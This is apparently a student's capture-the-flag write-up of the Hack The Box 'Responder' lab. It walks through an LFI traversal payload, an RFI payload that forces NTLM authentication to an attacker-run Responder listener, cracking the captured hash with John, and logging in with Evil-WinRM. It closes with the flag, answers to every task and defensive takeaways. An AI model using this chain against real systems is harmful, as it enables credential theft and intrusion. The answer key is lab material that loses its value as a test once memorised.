# Hack The Box: Responder Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** LFI, RFI, NTLM, Hash Cracking, Evil-WinRM, Windows

Another day, another box! Today we're exploiting a Local File Include vulnerability to steal NTLM credentials using Responder, cracking the hash with John The Ripper, and getting a shell via Evil-WinRM 😄 Let's dive in 🚀

---

## What is Responder?

Responder is a Very Easy machine from Hack The Box Starting Point Tier 1. It covers Local File Inclusion (LFI), Remote File Inclusion (RFI), NTLM hash capturing using the Responder tool, hash cracking with John The Ripper, and remote access via Evil-WinRM.

**Skills covered:**
- Network reconnaissance with Nmap
- Local File Inclusion (LFI) exploitation
- Capturing NTLM hashes with Responder
- Hash cracking with John The Ripper
- Remote shell access with Evil-WinRM

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Spawn the Responder machine. My target IP was `10.129.107.48`.

<!-- ADD: machine_IP.png here -->

---

## Step 1 — Ping the Target

Confirm the machine is reachable:

```bash
ping -c 4 10.129.107.48
```

All 4 packets returned with 0% packet loss. Target is alive. ✅

<!-- ADD: ping_check.png here -->

---

## Step 2 — Nmap Scan

Run a full service version scan:

```bash
nmap -sVC -T4 10.129.107.48
```

<!-- ADD: nmap__scan.png here -->

**Results:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows
```

Two open ports:
- **Port 80** — Apache web server running PHP on Windows
- **Port 5985** — WinRM (Windows Remote Management) — this is what we'll use later to get a shell

The WinRM service listens on port **5985** (Task 10).

---

## Step 3 — Web Enumeration

Visit `http://10.129.107.48` in the browser. The site redirects us to `unika.htb` (Task 1).

To make this work, add it to your `/etc/hosts` file:

```bash
echo "10.129.107.48 unika.htb" | sudo tee -a /etc/hosts
```

Now visit `http://unika.htb`. The site is built with **PHP** (Task 2).

Looking at the URL when switching languages, we can see a `page` parameter being used:

```
http://unika.htb/index.php?page=french.html
```

The URL parameter used to load different language versions is **`page`** (Task 3).

---

## Step 4 — Local File Inclusion (LFI) & Remote File Inclusion (RFI)

The `page` parameter loads files directly — this is a classic **Local File Inclusion** vulnerability. We can test it by trying to read a Windows system file:

```
http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

This is an example of exploiting LFI (Task 4).

For **Remote File Inclusion (RFI)**, we can point the parameter to a file on our own machine (Task 5):

```
//10.10.14.6/somefile
```

We will use RFI to force the Windows machine to authenticate to our machine — and capture its NTLM hash using Responder.

---

## Step 5 — Find Your VPN IP

Before running Responder, find your tun0 (VPN) interface IP:

```bash
ip a
```

<!-- ADD: ip_info.png here -->
<!-- ADD: ip_details.png here -->

My tun0 IP was `10.10.16.123`. This is the IP we'll use with Responder.

---

## Step 6 — Start Responder

**NTLM** stands for **New Technology LAN Manager** (Task 6) — it is Windows' challenge-response authentication protocol. When we point the RFI to our machine, Windows tries to authenticate using NTLM, and Responder captures that hash.

First check the Responder interface flag:

```bash
responder -h | grep interface
```

<!-- ADD: responder_help.png here -->

The flag to specify the network interface is **`-I`** (Task 7).

Now run Responder on the tun0 interface:

```bash
sudo responder -I tun0 -v
```

<!-- ADD: responder_command.png here -->

---

## Step 7 — Trigger the NTLM Capture

With Responder listening, trigger the RFI by visiting this URL in the browser (replace with your tun0 IP):

```
http://unika.htb/?page=//10.10.16.123/somefile
```

Windows tries to authenticate to our fake SMB server and Responder captures the NTLMv2 hash!

<!-- ADD: responder_response.png here -->

```
[SMB] NTLMv2-SSP Username : Administrator
[SMB] NTLMv2-SSP Hash    : Administrator::RESPONDER:5b7ca5ac9b214f5a:...
```

---

## Step 8 — Save the Hash

Copy the full hash into a file:

```bash
echo "Administrator::RESPONDER:..." > admin.hash
```

<!-- ADD: copy_hash_into_file.png here -->

---

## Step 9 — Crack the Hash with John The Ripper

The tool used to crack NetNTLMv2 hashes is **John The Ripper** (Task 8):

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
```

<!-- ADD: crack_the_hash.png here -->

**Result:**

```
badminton    (Administrator)
```

The administrator password is **`badminton`** (Task 9).

---

## Step 10 — Remote Shell with Evil-WinRM

Now use Evil-WinRM to connect to port 5985 with the cracked credentials:

```bash
sudo evil-winrm -u Administrator -p badminton -i 10.129.107.48
```

We're in! Navigate to find the flag. The flag is on **mike's** desktop (Task 11):

```powershell
cd C:\Users\mike\Desktop
cat flag.txt
```

<!-- ADD: evil_winrm_output.png here -->

---

## Flag

```
ea81b7afddd03efaa0945333ed147fac
```

---

## Task Answers

**Task 1 — What domain does the IP redirect to?**
`unika.htb`

**Task 2 — What scripting language is used on the server?**
`PHP`

**Task 3 — What URL parameter loads different language versions?**
`page`

**Task 4 — Which value is an example of LFI exploitation?**
`../../../../../../../../windows/system32/drivers/etc/hosts`

**Task 5 — Which value is an example of RFI exploitation?**
`//10.10.14.6/somefile`

**Task 6 — What does NTLM stand for?**
`New Technology LAN Manager`

**Task 7 — Which Responder flag specifies the network interface?**
`-I`

**Task 8 — What is the full name of the hash cracking tool john?**
`John The Ripper`

**Task 9 — What is the administrator password?**
`badminton`

**Task 10 — What port does WinRM listen on?**
`5985`

**Task 11 — On which user's desktop is the flag?**
`mike`

---

## What I Learned

Responder shows a powerful attack chain — from a simple LFI vulnerability all the way to a full Windows shell. Key takeaways:

- **Never allow user input to control file paths** — LFI and RFI can lead to credential theft
- **Disable NTLM authentication** where possible and use Kerberos instead
- **Use strong passwords** — `badminton` was cracked in seconds with rockyou.txt
- **Restrict WinRM access** to trusted IPs only using firewall rules

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
